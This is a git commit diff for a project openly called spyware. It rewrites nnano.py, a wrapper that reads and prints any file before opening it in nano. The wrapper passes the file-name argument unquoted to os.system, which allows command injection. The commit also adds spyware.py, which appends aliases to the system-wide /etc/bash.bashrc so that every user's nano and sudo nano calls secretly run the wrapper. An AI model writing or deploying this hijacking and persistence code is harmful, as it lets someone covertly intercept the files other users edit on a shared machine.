b2d08b5f2595da69057d86f823c6673c6acd2109
Michael Rudolf <michael.rudolf85@gmail.com>
2024-12-24 15:13:01 +0100

    Nano is now executed in the python file nnano.py & the file virus.py is now named spyware.py.

--- nnano.py
+++ nnano.py
@@ -1,16 +1,18 @@
 import sys
-import firebase_admin
-from firebase_admin import credential, firestore, storage
+import os
 
-cred = credentials.Certificate
 # Set a default value for the file_text
 file_text = ""
 
 print("length: " + str(len(sys.argv)))
 if len(sys.argv) > 1:
-    print("arguments provided" + sys.argv[1])
+    print("arguments provided:" + sys.argv[1])
     with open(sys.argv[1]) as file:
         file_text = file.read()
     print(file_text)
-
+    
+    os.system("echo DebugInfo: Python code executed successfully.")
+    os.system("nano " + sys.argv[1])
+else:
+    os.system("nano")
 
---
+++ spyware.py
@@ -0,0 +1,7 @@
+file_data = ""
+with open('/etc/bash.bashrc', 'r') as file:
+    file_data = file.read()
+
+
+with open('/etc/bash.bashrc', 'w') as file:
+    file.write(file_data + "alias sudo='sudo '; alias nano='python3 /home/$USER/SomeSpyware/nnano.py'")
